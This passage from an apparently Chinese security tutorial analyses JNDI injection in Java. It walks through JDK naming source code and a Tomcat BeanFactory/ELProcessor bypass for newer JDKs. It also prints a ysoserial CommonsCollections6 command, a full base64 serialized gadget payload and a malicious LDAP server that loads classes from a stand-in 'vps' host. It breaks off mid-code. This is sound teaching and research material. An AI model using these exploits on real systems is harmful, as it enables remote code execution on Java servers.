经过一系列的`lookup`调用，最终走到了`LdapCtx#c_lookup`中，通过调用`DirectoryManager.getObjectInstance`，走出协议对应的类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">c_lookup</span><span class="params">(Name var1, Continuation var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        var2.setError(<span class="built_in">this</span>, var1);</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> DirectoryManager.getObjectInstance(var3, var1, <span class="built_in">this</span>, <span class="built_in">this</span>.envprops, (Attributes)var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var2.fillInException(var16);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var24</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;problem generating object using object factory&quot;</span>);</span><br><span class="line">            var24.setRootCause(var17);</span><br><span class="line">            <span class="keyword">throw</span> var2.fillInException(var24);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>走入<code>DirectoryManager#getObjectInstance</code>后，我们发现和rmi的的后半段是基本一样的，进入<code>getObjectFactoryFromReference</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment, Attributes attrs)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">                <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                    factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                    <span class="keyword">if</span> (factory <span class="keyword">instanceof</span> DirObjectFactory) &#123;</span><br><span class="line">                        <span class="keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(</span><br><span class="line">                            ref, name, nameCtx, environment, attrs);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                         environment);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">                &#125; ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里就和rmi一样了，首先进行本地类加载，若在本地没有找到，则从codebase中查找，若找到则进行类加载，最后进行类的初始化，触发构造函数，弹出计算机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="nNAiJ">JDK高版本绕过</h2>
<h3 id="WRK3l">JDK8u191之后</h3>
<h4 id="RW8TM">本地恶意CLass绕过</h4>
在jdk8u191后，LDAP已经修复，在进行codebase远程类加载时候，添加了一个限制条件

<p>如果<code>trustURLCodebase</code>为true时，才能进行远程类加载</p>
<p>更换高版本后，原来的给攻击既不弹计算器，也不会报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736748651382-30f900c0-794e-4719-885b-944e33751a82.png"></p>
<p>···</p>
<p>既然他不能远程加载对象了，那我们可以想想，是否有本地工厂，可以利用呢？</p>
<p>该恶意<code>Factory</code>必须实现<code>javax.naming.spi.ObjectFactory</code>接口，并实现<code>getObjectInstance()</code>方法</p>
<p>在tomcat的核心包中，存在着一个<code>BeanFactory</code>，它的<code>getObjectInstance</code>方法存在着反射调用的地方，如果说我们这里参数可控，则可以造成代码执行，因此我们这个高版本绕过，是基于<strong>tomcat环境</strong>的（方法很长，大部分省略）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                .......</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                method.invoke(bean, valueArray);</span><br><span class="line">                            &#125; </span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="mfgHp">实现</h5>
我在这里起一个RMI环境

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后起将一个<code>ResourceRef</code>绑定到remoteObj上面，使用客户端的<code>lookup</code>方法进行查询，即可执行恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIByPass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        InitialContext initialContext= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ElProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>,<span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,ref);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741399917776-e14d0309-fcfd-4f4e-8bfb-dcda444ba8dc.png"></p>
<h5 id="yvE8v">分析</h5>
与前面的调用相类似，经过一些`lookup`方法的调用，和`decodeObject`方法过后，走到`NamingManager#getObjectInstance`中，执行`getObjectFactoryFromReference`方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这个方法中，首先会在本地进行类加载，与之前的不同，这次可以在本地找到<code>BeanFactory</code>,即可在本地进行加载，最后return时候进行实例化，我们即可获得一个<code>BeanFactory</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736826588859-3fe4acb2-756a-462d-8500-b8354c440584.png"></p>
<p>返回后，接下来我们要走到<code>factory.getObjectInstance(ref, name, nameCtx,environment)</code>中，也就是<code>BeanFactory#getObjectInstance</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference)obj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;</span><br><span class="line">                        <span class="type">ClassNotFoundException</span> <span class="variable">e</span> <span class="operator">=</span> var25;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">                    PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line">                    <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">                    Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                    String value;</span><br><span class="line">                    String propName;</span><br><span class="line">                    <span class="type">int</span> i;</span><br><span class="line">                    <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                        value = (String)ra.getContent();</span><br><span class="line">                        Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;;</span><br><span class="line">                        String[] arr$ = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                        i = arr$.length;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; i; ++i$) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">param</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                            param = param.trim();</span><br><span class="line">                            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> param.indexOf(<span class="number">61</span>);</span><br><span class="line">                            <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                propName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                                param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                propName = <span class="string">&quot;set&quot;</span> + param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + param.substring(<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                forced.put(param, beanClass.getMethod(propName, paramTypes));</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (SecurityException | NoSuchMethodException var24) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Forced String setter &quot;</span> + propName + <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                            <span class="keyword">do</span> &#123;</span><br><span class="line">                                <span class="keyword">do</span> &#123;</span><br><span class="line">                                    <span class="keyword">do</span> &#123;</span><br><span class="line">                                        <span class="keyword">do</span> &#123;</span><br><span class="line">                                            <span class="keyword">do</span> &#123;</span><br><span class="line">                                                <span class="keyword">if</span> (!e.hasMoreElements()) &#123;</span><br><span class="line">                                                    <span class="keyword">return</span> bean;</span><br><span class="line">                                                &#125;</span><br><span class="line"></span><br><span class="line">                                                ra = (RefAddr)e.nextElement();</span><br><span class="line">                                                propName = ra.getType();</span><br><span class="line">                                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;factory&quot;</span>));</span><br><span class="line">                                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;scope&quot;</span>));</span><br><span class="line">                                    &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;auth&quot;</span>));</span><br><span class="line">                                &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;forceString&quot;</span>));</span><br><span class="line">                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;singleton&quot;</span>));</span><br><span class="line"></span><br><span class="line">                            value = (String)ra.getContent();</span><br><span class="line">                            Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method)forced.get(propName);</span><br><span class="line">                            <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = value;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    method.invoke(bean, valueArray);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Forced String setter &quot;</span> + method.getName() + <span class="string">&quot; threw exception for property &quot;</span> + propName);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ra是从引用里获取<code>forceString</code>，我们这里传入的值为<code>x=eval</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741400707689-1853e352-e2ba-43ec-8a29-f4de959e0ffe.png"></p>
<p>这里会检查，是否存在<code>=</code>(等于号的ascii为61)，不存在就会调用默认属性的setter方法，存在就会取其键值，键为属性名，而值是其指定的setter方法</p>
<p>这里这段代码，把x的setter强行指定为<code>eval</code>方法，这就是我们的关键利用点，之后就会获取<code>beanClass</code>即</p>
<p><code>javax.el.ELProcessor</code>的<code>eval</code>方法并同<code>x</code>属性一同放入<code>forced</code>这个<code>HashMap</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741400791897-fa0822d8-b00b-4e89-aef7-d501e0f06d0c.png"></p>
<p>接着是多个 do while 语句来遍历获取 <code>ResourceRef</code> 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用<code>getContent()</code>方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 <code>ResourceRef</code> 类实例添加的第二个元素</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401357575-539ecba6-7ce2-41a2-9ff2-5e8c2f423490.png">获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即<code>javax.el.ELProcessor</code>类的<code>eval()</code>方法并赋值给method变量，最后就是通过<code>method.invoke()</code>即反射调用的来执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401466693-3ec57d1b-642c-460d-8d14-274dc995b47f.png"></p>
<h4 id="n52C0">LDAP返回序列化数据，触发本地Target</h4>
LDAP除了支持JNDI Reference这种利用方法，还支持直接返回一个序列化的对象，若Java对象的javaSerializedData属性不为空，则客户端的`obj.decodeObject()`方法就会最这个字段的内容进行反序列化

<p>若服务端的ClassPath中存在反序列化利用点的Gadget，例如CC依赖等等，就可以实现LDAP结合该Garget实现反序列化漏洞攻击</p>
<p>我们这里使用CC6来实现攻击</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master.jar CommonsCollections6 <span class="string">&#x27;calc&#x27;</span> | base64</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=</span><br></pre></td></tr></table></figure>

<p>恶意LDAP服务器如下（服务端和客户端都要导入CC依赖）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIGadgetServer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://vps:8000/#ExportObject&quot;</span>;  </span><br><span class="line"> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line"> InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line"> <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span 